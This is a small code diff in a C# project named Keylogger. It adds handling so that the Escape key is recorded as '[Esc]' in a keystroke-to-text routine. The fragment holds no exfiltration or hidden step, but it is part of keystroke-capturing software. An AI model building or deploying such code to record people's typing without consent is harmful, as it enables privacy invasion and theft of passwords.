@@ -26,6 +26,10 @@ namespace Keylogger
             {
                 output = "[Back]";
             }
+            else if (args.Key == Keys.Escape)
+            {
+                output = "[Esc]";
+            }
             else if (!args.IsSystemKey)
             {
                 output = args.UnicodeValue;
